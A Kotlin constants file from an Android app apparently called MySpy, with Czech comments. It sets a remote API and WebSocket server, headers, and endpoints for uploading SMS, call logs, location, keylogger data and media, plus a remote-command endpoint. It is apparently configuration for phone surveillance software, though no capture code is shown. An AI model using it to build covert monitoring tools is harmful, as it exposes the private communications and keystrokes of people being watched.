package com.myspy.android.core.constants

/**
 * API Constants
 *
 * @author Michael KOJDL
 * @version 1.0.0
 * @revision 2025-10-30
 *
 * @description Konstanty pro API komunikaci
 *
 * Parametry:
 * - API_BASE_URL: Base URL pro REST API
 * - WSS_BASE_URL: Base URL pro WebSocket
 * - CERTIFICATE_PINS: SHA-256 pinning pro SSL certifikáty
 * - TIMEOUT_CONNECT: Timeout pro připojení (sec)
 * - TIMEOUT_READ: Timeout pro čtení (sec)
 * - TIMEOUT_WRITE: Timeout pro zápis (sec)
 */
object ApiConstants {
    const val API_BASE_URL = "https://api.myspy.fir.ma/api/v1/"
    const val WSS_BASE_URL = "wss://wss.myspy.fir.ma/"

    // Certificate pinning (AKTUALIZOVAT podle vašeho certifikátu!)
    val CERTIFICATE_PINS = arrayOf(
        "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        "sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB="
    )

    // Timeouts (v sekundách)
    const val TIMEOUT_CONNECT = 30L
    const val TIMEOUT_READ = 30L
    const val TIMEOUT_WRITE = 30L

    // Retry policy
    const val MAX_RETRIES = 3
    const val RETRY_DELAY_MS = 2000L

    // API Endpoints
    const val ENDPOINT_REGISTER = "register"
    const val ENDPOINT_AUTH_LOGIN = "auth/login"
    const val ENDPOINT_AUTH_REFRESH = "auth/refresh"
    const val ENDPOINT_SMS = "sms"
    const val ENDPOINT_CALLS = "calls"
    const val ENDPOINT_LOCATION = "location"
    const val ENDPOINT_APPS = "apps"
    const val ENDPOINT_INTERNET = "internet"
    const val ENDPOINT_KEYLOGGER = "keylogger"
    const val ENDPOINT_MEDIA = "media"
    const val ENDPOINT_CONTROL = "control/command"

    // Headers
    const val HEADER_UUID = "X-Device-UUID"
    const val HEADER_API_KEY = "X-API-Key"
    const val HEADER_CONTENT_TYPE = "Content-Type"
    const val HEADER_ACCEPT = "Accept"

    const val CONTENT_TYPE_JSON = "application/json"
}
